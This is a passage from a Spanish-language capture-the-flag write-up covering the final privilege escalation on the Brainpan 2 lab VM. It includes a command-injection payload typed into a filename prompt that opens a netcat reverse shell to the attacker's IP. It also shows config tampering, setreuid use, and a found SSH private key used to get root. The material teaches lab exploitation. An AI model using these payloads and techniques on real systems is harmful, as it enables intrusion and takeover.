</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">El archivo <code class="language-plaintext highlighter-rouge">cfg</code> contiene un <code class="language-plaintext highlighter-rouge">puerto</code> y una direccion <code class="language-plaintext highlighter-rouge">ip</code>, y parece que esta es la conifuracion que usa como listener el binario <code class="language-plaintext highlighter-rouge">brainpan-1.8.exe</code> al ejecutarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ cat brainpan.cfg
port=9333
ipaddr=127.0.0.1
</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ ./brainpan-1.8.exe  
port = 9333
ipaddr = 127.0.0.1
+ bind done
+ waiting for connections...</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que podemos escribir en el archivo cfg cambiamos la variable ipaddr por <code class="language-plaintext highlighter-rouge">0.0.0.0</code> para que podamos acceder al puerto <code class="language-plaintext highlighter-rouge">9333</code> desde nuestro equipo de atacante</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ echo -e "port=9333\nipaddr=0.0.0.0" > brainpan.cfg  
</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ cat brainpan.cfg
port=9333
ipaddr=0.0.0.0
</span><span class="ve">root@brainpan2</span><span class="p">:</span><span class="az">/opt/old/brainpan-1.8</span><span class="p">$ ./brainpan-1.8.exe
port = 9333
ipaddr = 0.0.0.0
+ bind done
+ waiting for connections...</span>
</code></pre></div></div><br>

<p class="plain-text">Al conectarnos al puerto <code class="language-plaintext highlighter-rouge">9333</code> podemos ver que corre el mismo servicio del inicio</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat </span><span class="p">192.168.100.5 9333
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[______________________ WELCOME TO BRAINPAN 1.8________________________]  
                             LOGIN AS GUEST                             

                          >></span>
</code></pre></div></div><br>

<p class="plain-text">Sabemos que podemos ejecutar <code class="language-plaintext highlighter-rouge">comandos</code>, asi que volvemos a hacer el proceso de autenticarnos como <code class="language-plaintext highlighter-rouge">GUEST</code> y aprovechandonos de <code class="language-plaintext highlighter-rouge">VIEW</code> nos enviamos una shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">                          >> GUEST
                          ACCESS GRANTED


                             *  *  *  *                                
    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
                             *  *  *  *                                


                          >> VIEW
    ENTER FILE TO DOWNLOAD: test; netcat -e /bin/sh 192.168.100.73 443  </span>
</code></pre></div></div><br>

<p class="plain-text">Al hacerlo recibimos nuevamente una shell esta vez como <code class="language-plaintext highlighter-rouge">puck</code>, al lanzarnos una <code class="language-plaintext highlighter-rouge">bash</code> usaremos el parametro <code class="language-plaintext highlighter-rouge">-p</code> ya que estamos bajo el contexto del binario <code class="language-plaintext highlighter-rouge">suid</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443 
Listening on 0.0.0.0 443
Connection received on 192.168.100.5
script /dev/null -c "bash -p"
bash-4.2$ whoami
puck
bash-4.2$ hostname -I
192.168.100.5 
bash-4.2$</span>
</code></pre></div></div><br>

</section>
<section class="post" id="shell-root2">
<br><h3 class="post-title">Shell - root 2</h3><br>

<p class="plain-text">Nuevamente con python actualizamos nuestro uid y gid por <code class="language-plaintext highlighter-rouge">1001</code> correspondiente a <code class="language-plaintext highlighter-rouge">puck</code>, para asi obtener una <code class="language-plaintext highlighter-rouge">shell</code> que no tendra problemas por el identificador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">bash-4.2$ python2 
Python 2.7.3
>>> </span><span class="p">import </span><span class="p">os
>>> os.setreuid(</span><span class="p">1001</span><span class="p">, </span><span class="p">1001</span><span class="p">)
>>> os.system(</span><span class="p">"bash"</span><span class="p">)
</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ whoami 
puck
</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I  
192.168.100.5 
</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Al listar todos los archivos existentes partiendo del home de <code class="language-plaintext highlighter-rouge">puck</code> encontramos un clave privada <code class="language-plaintext highlighter-rouge">id_rsa</code> dentro de un directorio oculto que es <code class="language-plaintext highlighter-rouge">~/.backup/.ssh/</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ find
.
./.ssh
./.ssh/known_hosts
./.ssh/id_rsa.pub
./.ssh/id_rsa
./.profile
./.bash_history
./.backup
./.backup/.ssh
./.backup/.ssh/id_rsa.pub  
./.backup/.ssh/id_rsa
./.backup/.profile
./.backup/.bash_history
./.backup/.bashrc
./.backup/.bash_logout
./.bashrc
./.bash_logout
</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Al intentar conectarnos como el usuario <code class="language-plaintext highlighter-rouge">root </code> correspondiente al uid <code class="language-plaintext highlighter-rouge">0</code> al localhost nos dice que no tenemos conexion con el servicio ssh desde la <code class="language-plaintext highlighter-rouge">127.0.0.1:22</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ ssh "root "@127.0.0.1 -i .backup/.ssh/id_rsa  
ssh: connect to host 127.0.0.1 port 22: Connection refused
</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Si vemos la configuracion de <code class="language-plaintext highlighter-rouge">ssh</code> vemos que el servicio corre en <code class="language-plaintext highlighter-rouge">127.0.1.1:2222</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ grep -vE '^$|^#' /etc/ssh/sshd_config | head -n2  
Port 2222
ListenAddress 127.0.1.1
</span><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Nos conectamos como el usuario <code class="language-plaintext highlighter-rouge">root </code> a la <code class="language-plaintext highlighter-rouge">127.0.1.1</code> por el puerto <code class="language-plaintext highlighter-rouge">22</code> usando la <code class="language-plaintext highlighter-rouge">id_rsa</code> para autenticarnos y obtenemos una shell como el <code class="language-plaintext highlighter-rouge">root</code> que tiene el uid <code class="language-plaintext highlighter-rouge">0</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">puck@brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">$ ssh "root "@127.0.1.1 -p 2222 -i .backup/.ssh/id_rsa  
</span><span class="ve">root @brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p"># id
uid=0(root ) gid=0(root ) groups=0(root )
</span><span class="ve">root @brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
192.168.100.5 
</span><span class="ve">root @brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/flag.txt 

                          !!! CONGRATULATIONS !!!

                 You've completed the Brainpan 2 challenge! 
                 Or have you...? 

                 Yes, you have! Pat yourself on the back. :-)

                 Questions, comments, suggestions for new VM
                 challenges? Let me know! 


                 Twitter: @superkojiman
                 Email  : contact@techorganic.com
                 Web    : http://www.techorganic.com

</span><span class="ve">root @brainpan2</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
